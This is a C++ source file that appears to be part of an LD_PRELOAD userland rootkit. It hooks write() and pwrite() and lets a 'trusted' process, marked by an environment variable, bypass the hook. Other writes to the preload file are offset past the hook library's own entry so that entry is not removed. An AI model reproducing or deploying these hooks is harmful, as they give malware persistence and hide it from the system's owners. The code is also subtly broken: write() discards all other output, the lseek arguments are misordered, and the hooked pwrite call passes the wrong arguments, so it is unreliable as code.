
#include "main.h"



ssize_t write (int fd, void *buf, size_t count) {
	std::string lnkAim;
	CErrnoSaver serr;
	WRITE wrPtr = (WRITE)dlsym (RTLD_NEXT, "write");
	char *chPtr;
	

	assert (wrPtr != NULL);

	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		return wrPtr (fd, buf, count);
	}
	
	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
	
	if (lnkAim == prelFileName) {
		off_t pst = lseek (fd, SEEK_CUR, 0);
		if (pst == -1) {
			serr.set (EBADF);
			return pst;
		}
		
		if (-1 == lseek (fd, SEEK_SET, pst + (hookLibraryName + separator).size ())) {
			serr.set (EBADF);
			return -1;
		}
		return wrPtr (fd, buf, count);
	}
	
	
	return 0;
}

ssize_t pwrite (int fd, const void *buf, size_t count, off_t offset) {
	std::string lnkAim;
	CErrnoSaver serr;
	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
	char *chPtr;
	

	assert (pwrPtr != NULL);

	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		return pwrPtr (fd, buf, count, offset);
	}
	
	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
	
	if (lnkAim == prelFileName) {
		return pwrPtr (fd, buf, offset + (hookLibraryName + separator).size ());
	}
	
	
	return pwrPtr (fd, buf, count, offset);
}








